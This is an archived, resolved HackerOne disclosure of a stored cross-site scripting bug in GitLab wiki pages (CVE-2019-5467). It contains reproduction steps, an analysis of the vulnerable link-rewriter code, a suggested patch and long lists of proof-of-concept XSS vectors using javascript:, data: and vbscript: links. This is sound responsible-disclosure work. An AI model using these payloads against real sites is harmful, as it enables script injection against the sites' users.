---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2019-09-02
submitted: 2019-04-04T12:14:14.275Z
bounty_usd: null
votes: 633
cve: "CVE-2019-5467"
program: "[[programs/gitlab|GitLab]]"
reporter: "ryhmnlfj"
source: "https://hackerone.com/reports/526325"
title: "Stored XSS in Wiki pages"
---
# Stored XSS in Wiki pages

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 633 | **Program:** GitLab | **Disclosed:** 2019-09-02

- Report: [https://hackerone.com/reports/526325](https://hackerone.com/reports/526325)
- CWE: Cross-site Scripting (XSS) - Stored | CVE: CVE-2019-5467
- Submitted: 2019-04-04T12:14:14.275Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

I found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages.

### Steps to reproduce

1. Sign in to GitLab.
2. Open a Project page that you have permission to edit Wiki pages.
3. Open Wiki page.
4. Click "New page" button.
5. Fill out "Page slug" form with `javascript:`.
6. Click "Create page" button.
7. Fill out the each form as follows:    
Title: `javascript:`    
Format: Markdown    
Content: `[XSS](.alert(1);)`    
(Please see "CreatePage.png")    
{F462086}    
8. Click "Create page" button.
9. Click "XSS" link in created page.

### What is the current *bug* behavior?

The alert dialog appears after clicking "XSS" link in created page.
Please see "Result_Firefox.png".
{F462087}

#### Description In Detail:

GitLab application converts the Markdown string `.alert(1);` to the href attribute `javascript:alert(1);`.
Furthermore, Wiki-specific Markdown string `.` is converted to `javascript:` in this case.

### What is the expected *correct* behavior?

The dangerous href attribute `javascript:alert(1);` should be filtered.
A safe HTTP/HTTPS link should be rendered instead.

### Additional Informations:

1. In the above case, another Wiki-specific Markdown string `..` is also converted to `javascript:`.

2. Using Title string such as `javascript:STRING_EXPECTED_REMOVING` also reproduces this vulnerability.
For example, if a wiki page is created with a disguised Title string `JavaScript::SubClassName.function_name`, GitLab application converts Wiki-specific Markdown string `.` to `JavaScript:` in such page.
It seems that GitLab application recognizes scheme-like string `JavaScript:` and removes the rest of Title string `:SubClassName.function_name`.

3. An attacker can use various schemes by replacing Title string `javascript:` to other scheme. (e.g. `data:`, `vbscript:`, and so on.)

### Output of checks

This bug happens on the official Docker installation of GitLab Enterprise Edition 11.9.4-ee.

#### Results of GitLab environment info

Output of `sudo gitlab-rake gitlab:env:info`:

```
System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.5.3p105
Gem Version:	2.7.6
Bundler Version:1.16.6
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.18.1
Sidekiq Version:5.2.5
Go Version:	unknown

GitLab information
Version:	11.9.4-ee
Revision:	55be7f0
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	postgresql
DB Version:	9.6.11
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	8.7.1
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

If wiki pages created by using this vulnerability are visible to everyone (Wiki Visibility setting is set to "Everyone With Access") in "Public" project, there is a possibility that a considerable number of GitLab users and visitors click a malicious link.

## Timeline

- **2019-04-04** @ryhmnlfj: #####Note:
I omitted the items in your template of report that became blank after replacement of the (parenthesized) sections.
I also omitted **Relevant logs and/or screenshots** section because I put a reference to the screenshots in the appropriate position.
As I would like to provide the more detailed information to you, I added **Additional Informations** section.
The **Impact** section duplicates with the same-name section of the HackerOne's submission form, so I wrote the **Impact** in the HackerOne's submission form which is set to required input.

Thank you,
ryhmnlfj
- **Report Filed**
- **2019-04-04** @gitlab-securitybot: Hi @ryhmnlfj,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 20 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **Report Triaged**
- **2019-04-06** @gitlab-securitybot: ETA for fix:

Hi @ryhmnlfj,

The GitLab issue created from your report is currently scheduled for 2019-06-22.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2019-04-07** @ryhmnlfj: Hi @hackerjuan,
Thank you for triaging my first report!
- **2019-05-17** @ryhmnlfj: Hi @hackerjuan,

After submitting the first report, I investigated the backend source code. As a result, I found some new things, so I send this additional report. Though your mitigation may already be in progress or completed, I hope this report helps your reviewing and testing.

The environment I investigated is the official Docker installation of GitLab Enterprise Edition `11.10.4-ee`.

## Vulnerable code

After the GitLab application converts Markdown text to HTML Markup text, it performs URI string reconstruction and link replacement as Wiki-specific processing. The problem is that NO filtering is performed on the reconstructed URI string at this time. Here is the code that performs the URI string reconstruction:

**lib/banzai/filter/wiki_link_filter/rewriter.rb**
```ruby
        def apply_rules
          # Special case: relative URLs beginning with `/uploads/` refer to
          # user-uploaded files will be handled elsewhere.
          return @uri.to_s if public_upload?

          # Special case: relative URLs beginning with Wikis::CreateAttachmentService::ATTACHMENT_PATH
          # refer to user-uploaded files to the wiki repository.
          unless repository_upload?
            apply_file_link_rules!
            apply_hierarchical_link_rules!
          end

          apply_relative_link_rules!
          @uri.to_s
        end

        private

        # Of the form 'file.md'
        def apply_file_link_rules!
          @uri = Addressable::URI.join(@slug, @uri) if @uri.extname.present?
        end

        # Of the form `./link`, `../link`, or similar
        def apply_hierarchical_link_rules!
          @uri = Addressable::URI.join(@slug, @uri) if @uri.to_s[0] == '.'
        end
```

In the first reported case, `apply_hierarchical_link_rules!` function performs URI string reconstruction. If Title is `JavaScript::ClassName.function_name` and the Content is `[XSS](.alert(1);)` in the Wiki page creation form, the content of `@slug` is `JavaScript::ClassName.function_name` and the content of `@uri` is `.alert(1);`. `@slug` and `@uri` are combined by the `Addressable::URI.join` function, but parsing inside the `Addressable::URI.join` function removes `:ClassName.function_name` from `@slug` and `.` from `@uri` respectively. (I wrote in the first report that `.` is converted to `JavaScript:`, but in fact the unnecessary strings are removed from each variable respectively.) The problem is that NO filtering is performed on the URI strings reconstructed by `Addressable::URI.join` function. In this case, `apply_rules` function returns the reconstructed URI string as it is. And this string is used for link replacement.

#### Another type of vector via `apply_file_link_rules!`

Also, `apply_file_link_rules!` function shows the existence of another similar vector. For example, if the Content is `[XSS](alert(document.location);)` in the Wiki page creation form, the content of `@uri` is `alert(document.location);`. `@uri.extname` returns the string `.location)` for the input string `alert(document.location);`. The string `.location)` is recognized as a file extension. Therefore, `@uri.extname.present?` returns true for the input string `alert(document.location);`, so `Addressable::URI.join` function is executed for this case as well.


## Patch example for mitigation

The **expected *correct* behavior** I mentioned in the first report was as follows:

>The dangerous href attribute `javascript:alert(1);` should be filtered.
>A safe HTTP/HTTPS link should be rendered instead.

An example of a patch with this policy is as follows. (However, this patch assumes that the content of `@wiki_base_path` is a safe URI string.)

**lib/banzai/filter/wiki_link_filter/rewriter.rb**
```diff
        def apply_rules
          # Special case: relative URLs beginning with `/uploads/` refer to
          # user-uploaded files will be handled elsewhere.
          return @uri.to_s if public_upload?

          # Special case: relative URLs beginning with Wikis::CreateAttachmentService::ATTACHMENT_PATH
          # refer to user-uploaded files to the wiki repository.
          unless repository_upload?
            apply_file_link_rules!
            apply_hierarchical_link_rules!
          end

          apply_relative_link_rules!
+         block_unsafe_uri!
          @uri.to_s
        end

        private

+       def block_unsafe_uri!
+         return unless @uri.scheme
+         scheme = @uri.scheme.strip.downcase.gsub(/[^A-Za-z0-9\+\.\-]+/, '')
+         contains_unsafe = Banzai::Filter::SanitizationFilter::UNSAFE_PROTOCOLS.any? { |protocol| scheme.include?(protocol) }
+         @uri = Addressable::URI.parse(@wiki_base_path) if contains_unsafe
+       end
```

If you need to remove attributes or tags themselves that contains the dangerous URI string, I think it would be better to do blocking within **lib/banzai/filter/wiki_link_filter.rb**.

Also, since the similar code have been written in **lib/banzai/filter/autolink_filter.rb** and **lib/banzai/filter/sanitization_filter.rb**, I think that it is better to make a shared module to prevent code clones.


## Markdown/Markup elements in the scope of vulnerability

In the first report, I mentioned only the links generated by Markdown string `[LinkTitle](url)` as the scope of vulnerability, but in this investigation, I found that the links and attributes generated by Markdown string `![ImageOrVideoTitle](url)` are also in the scope. The following part of the source code points to it:

**lib/banzai/filter/wiki_link_filter.rb**
```ruby
    class WikiLinkFilter < HTML::Pipeline::Filter
      def call
        return doc unless project_wiki?

        doc.search('a:not(.gfm)').each { |el| process_link_attr(el.attribute('href')) }
        doc.search('video').each { |el| process_link_attr(el.attribute('src')) }
        doc.search('img').each do |el|
          attr = el.attribute('data-src') || el.attribute('src')

          process_link_attr(attr)
        end

        doc
      end
```
While `[LinkTitle](url)` only generates `<a>` tag, `![ImageOrVideoTitle](url)` generates both `<img>`/`<video>` and `<a>`. `process_link_attr` function performs the above-mentioned replacement process on attributes of `<a>`, `<img>` and `<video>`. `process_link_attr` function calls `apply_rules` function written in **lib/banzai/filter/wiki_link_filter/rewriter.rb** with appropriate arguments. Since `apply_rules` function is called as the replacement process, the mitigation is already sufficient as described above. However, test vectors to be described later will increase.

We can also write raw HTML within the Markdown text, so directly written `<a>`, `<img>` and other tags are also included in the scope. I added some test vectors for these too.


## Test vectors

The test vectors I used for this investigation are as follows.

*Note: Some of these test vectors do not contain scripts, and some do not work depending on the browser and its security settings, but they all contain URIs that should be blocked.*

### Test vectors for javascript: scheme

Title: `javascript::Test.vectors`

Content:
```
# A href (Markdown)
[A-href-Hierarchical-Dot](.alert(1);)

[A-href-Hierarchical-DotDot](..alert(1);)

[A-href-Hierarchical-DotSlashDotDotSlash](./../alert(1);)

[A-href-Extname](alert(document.location);)

# IMG (Markdown)
![IMG-src-Hierarchical-Dot](.alert(1);)

![IMG-src-Hierarchical-DotDot](..alert(1);)

![IMG-src-Hierarchical-DotSlashDotDotSlash](./../alert(1);)

![IMG-src-Extname](alert(document.location);)

# VIDEO (Markdown)
![VIDEO-src-Hierarchical-Dot](.alert(1);//fake.mp4)

![VIDEO-src-Hierarchical-DotDot](..alert(1);//fake.mp4)

![VIDEO-src-Hierarchical-DotSlashDotDotSlash](./../alert(1);//fake.mp4)

![VIDEO-src-Extname](alert(document.location);//fake.mp4)

# HTML A href (Markup)
<a href=".alert(1);">MARKUP-A-href-Hierarchical-Dot</a>

<a href="..alert(1);">MARKUP-A-href-Hierarchical-DotDot</a>

<a href="./../alert(1);">MARKUP-A-href-Hierarchical-DotSlashDotDotSlash</a>

<a href="alert(document.location);">MARKUP-A-href-Extname</a>

# HTML IMG (Markup)
<img src=".alert(1);" alt="MARKUP-IMG-src-Hierarchical-Dot"></img>

<img src="..alert(1);" alt="MARKUP-IMG-src-Hierarchical-DotDot"></img>

<img src="./../alert(1);" alt="MARKUP-IMG-src-Hierarchical-DotSlashDotDotSlash"></img>

<img src="alert(document.location);" alt="MARKUP-IMG-src-Extname"></img>
```

### Test vectors for data: scheme

Title: `data::Test.vectors`

Content:
```
# A href (Markdown)
[A-href-Hierarchical-Dot](.text/html,<script>alert(1);</script>)

[A-href-Hierarchical-DotDot](..text/html,<script>alert(1);</script>)

[A-href-Hierarchical-DotSlashDotDotSlash](./../text/html,<script>alert(1);</script>)

[A-href-Extname](text/html,<script>alert(1);</script>fake.text)

# IMG (Markdown)
![IMG-src-Hierarchical-Dot](.text/html,<script>alert(1);</script>)

![IMG-src-Hierarchical-DotDot](..text/html,<script>alert(1);</script>)

![IMG-src-Hierarchical-DotSlashDotDotSlash](./../text/html,<script>alert(1);</script>)

![IMG-src-Extname](text/html,<script>alert(1);</script>fake.text)

# VIDEO (Markdown)
![VIDEO-src-Hierarchical](.text/html,<script>alert(1);</script>fake.mp4)

![VIDEO-src-Hierarchical-DoubleDot](..text/html,<script>alert(1);</script>fake.mp4)

![VIDEO-src-Hierarchical-DotSlashDotDotSlash](./../text/html,<script>alert(1);</script>fake.mp4)

![VIDEO-src-Extname](text/html,<script>alert(1);</script>fake.mp4)

# HTML A href (Markup)
<a href=".text/html,<script>alert(1);</script>">MARKUP-A-href-Hierarchical-Dot</a>

<a href="..text/html,<script>alert(1);</script>">MARKUP-A-href-Hierarchical-DotDot</a>

<a href="./../text/html,<script>alert(1);</script>">MARKUP-A-href-Hierarchical-DotSlashDotDotSlash</a>

<a href="text/html,<script>alert(1);</script>fake.text">MARKUP-A-href-Extname</a>

# HTML IMG (Markup)
<img src=".text/html,<script>alert(1);</script>" alt="MARKUP-IMG-src-Hierarchical-Dot"></img>

<img src="..text/html,<script>alert(1);</script>" alt="MARKUP-IMG-src-Hierarchical-DotDot"></img>

<img src="./../text/html,<script>alert(1);</script>" alt="MARKUP-IMG-src-Hierarchical-DotSlashDotDotSlash"></img>

<img src="text/html,<script>alert(1);</script>fake.text" alt="MARKUP-IMG-src-Extname"></img>
```


### Visualized test vectors for data: scheme

Title: `data::VisualizedVectors.SVG`

Content:
```
IMG-src-Hierarchical-Dot
![IMG-src-Hierarchical-Dot](.image/svg+xml;base64,PHN2ZyB4PSI1MCIgeT0iNTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiPjxyZWN0IHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iZ3JlZW4iIC8+PC9zdmc+)

IMG-src-Hierarchical-DotDot
![IMG-src-Hierarchical-DotDot](..image/svg+xml;base64,PHN2ZyB4PSI1MCIgeT0iNTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiPjxyZWN0IHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iZ3JlZW4iIC8+PC9zdmc+)

IMG-src-Hierarchical-DotSlashDotDotSlash
![IMG-src-Hierarchical-DotSlashDotDotSlash](./../image/svg+xml;base64,PHN2ZyB4PSI1MCIgeT0iNTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiPjxyZWN0IHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iZ3JlZW4iIC8+PC9zdmc+)
```

*Note: The base64 string in these vectors is the encoded result of SVG as follows:*
```
<svg x="50" y="50" width="50" height="50" xmlns="http://www.w3.org/2000/svg" version="1.1">
    <rect width="40" height="40" fill="green" />
</svg>
```
*Here's screenshot of these vectors (VisualizedVectors.png):*

{F491694}

*I wanted to display GitLab Tanuki in these vectors, but I stopped it because the vector would be very long.*


### Test vector for nested Title

Title: `javascript:/nest1/nest2/nest3`

Content:
```
# A href (Markdown)
[A-href-nested-Title](../../../*COMMENT*/alert(1);)

# IMG (Markdown)
![IMG-src-nested-Title](../../../*COMMENT*/alert(1);)

# VIDEO (Markdown)
![VIDEO-src-nested-Title](../../../*COMMENT*/alert(1);//fake.mp4)

# HTML A href (Markup)
<a href="../../../*COMMENT*/alert(1);">MARKUP-A-href-nested-Title</a>

# HTML IMG (Markup)
<img src="../../../*COMMENT*/alert(1);" alt="MARKUP-IMG-src-nested-Title"></img>
```

*Note: In these cases, the content of* `@slug` *is* `javascript:/nest1/nest2/nest3` *and the content of* `@uri` *is* `../../../*COMMENT*/alert(1);` *in* **lib/banzai/filter/wiki_link_filter/rewriter.rb**. *When combining* `@slug` *and* `@uri`, `Addressable::URI.join` *function also resolves relative path.*
- **Report Resolved**
- **Bounty Awarded**
- **2019-06-05** @ryhmnlfj: Hi @hackerjuan, thank you for bounty!

> Please let us know if you find that our patch does not mitigate your finding.

The following two problems are **unresolved on `GitLab CE/EE 11.11.1`.**

* The following vector described in the additional report is still valid.  
  
  * Title: `javascript:`  
  * Format: Markdown  
  * Content: `[XSS](alert(document.location);)`  
  
  The function `apply_file_link_rules!` acts as a bypass because the string `.location)` is misrecognized as a file extension. For more details, please read the additional report I sent as a comment on 2019-05-17.

* `data:` and `vbscript:` are not blocked. These schemes are blocked by other filters in **lib/banzai/filter/**.
- **2019-06-05** @hackerjuan: Thanks for pointing this out! I'm going to reopen the report and the tracking issue and follow up with the developer. 
We'll let you know as soon as we have any updates.
- **Report Reopened**
- **2019-06-07** @gitlab-securitybot: ETA for fix:

Hi @ryhmnlfj,

The GitLab issue created from your report is currently scheduled for 2019-07-22.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2019-08-06** @gitlab-securitybot: ETA for fix:

Hi @ryhmnlfj,

The GitLab issue created from your report is currently scheduled for 2019-08-22.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Agreed On Going Public**
- **2019-09-02** @ryhmnlfj: Hi @akelly ,
Thanks for update. Let's disclose this report.
- **Agreed On Going Public**
- **Report Became Public**
